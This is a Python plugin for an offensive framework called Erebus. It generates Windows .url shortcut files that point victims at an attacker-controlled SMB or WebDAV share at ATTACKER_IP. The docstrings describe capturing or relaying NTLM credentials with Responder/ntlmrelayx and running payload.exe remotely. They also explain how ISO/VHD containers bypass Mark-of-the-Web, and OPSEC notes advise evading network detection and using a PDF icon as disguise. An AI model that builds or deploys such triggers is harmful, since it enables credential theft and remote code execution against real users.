"""
Erebus Plugin - URL / Internet Shortcut Trigger
Author: Whispergate
Description: Creates Windows .url (internet shortcut) trigger files.

Two delivery modes:
  SMB/UNC  - URL=file://ATTACKER_IP/share/payload.exe
             Triggers SMB auth to attacker; with Responder/ntlmrelayx captures creds
             or relays execution depending on relay target.
  WebDAV   - URL=http://ATTACKER_IP/payload.exe
             Auto-mounts attacker WebDAV share; executes payload from mapped drive.
             Avoids disk write; process lineage stays within explorer.exe.

Both modes bypass MOTW when placed inside an ISO/VHD container - files within
virtual disk images do not inherit the mark from the outer container download.
"""

import pathlib
import struct
import uuid
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class UrlTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating Windows .url (internet shortcut) trigger files.

    Best combined with ISO or VHD containers. The .url file mounts the attacker's
    SMB/WebDAV share and auto-executes the payload from it. No file touches the
    victim's local disk beyond the initial container mount.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="url_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates Windows internet shortcut (.url) triggers for SMB/WebDAV payload delivery",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_url_trigger": self.create_url_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] URL Trigger plugin loaded - Supporting internet shortcut creation")

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_url_trigger(
        self,
        target_url: str,
        output_filename: str = "document.url",
        icon_src: str = r"%SystemRoot%\system32\shell32.dll",
        icon_index: int = 1,
        payload_dir: Optional[pathlib.Path] = None,
        # [MALLEABLE] WorkingDirectory makes Explorer resolve relative paths
        # from the container mount point - useful for local payload fallback.
        working_directory: str = "",
        show_cmd: int = 7,  # 7 = minimised; 1 = normal; 3 = maximised
    ) -> pathlib.Path:
        """
        Create a Windows internet shortcut (.url) trigger file.

        When placed inside an ISO/VHD and double-clicked by a victim, Explorer
        opens the URL using the registered protocol handler:
          - file:// → SMB mount / UNC path execution
          - http://  → WebDAV auto-mount (WebClient service must be running)
          - ftp://   → FTP client launch (lower utility)

        Args:
            target_url:         Full URL the shortcut navigates to.
                                Examples:
                                  "file://192.168.1.1/share/payload.exe"
                                  "http://192.168.1.1/payload.exe"
            output_filename:    Output .url filename written to payload_dir.
            icon_src:           Path to icon DLL/EXE for display in Explorer.
            icon_index:         Index of icon within icon_src.
            payload_dir:        Directory to write the .url file into.
            working_directory:  Optional WorkingDirectory field (empty = omit).
            show_cmd:           ShowCmd value (7=minimised for stealth).

        Returns:
            pathlib.Path: Path to the created .url file.

        ## OPSEC Notes
        Detection Surface:
          - Shell32 processes .url files; WebDAV connections generate HTTP traffic
          - Sysmon Event 22 (DNS query) + Event 3 (network conn) for SMB/WebDAV
          - SMB auth to external host flagged by many NDR solutions
        Hardening:
          - Use WebDAV (http://) over SMB (file://) if NDR blocks outbound 445
          - Combine with a legitimate-looking icon (e.g., PDF icon from shell32)
          - Place inside ISO/VHD - no MOTW on contents, no attachment warning
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        lines = [
            "[{000214A0-0000-0000-C000-000000000046}]",
            "Prop3=19,11",
            "",
            "[InternetShortcut]",
            "IDList=",
            f"URL={target_url}",
            f"HotKey=0",
            f"ShowCmd={show_cmd}",
            f"IconFile={icon_src}",
            f"IconIndex={icon_index}",
        ]

        if working_directory:
            lines.append(f"WorkingDirectory={working_directory}")

        content = "\r\n".join(lines) + "\r\n"

        output_path = payload_dir / output_filename
        output_path.write_text(content, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = UrlTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
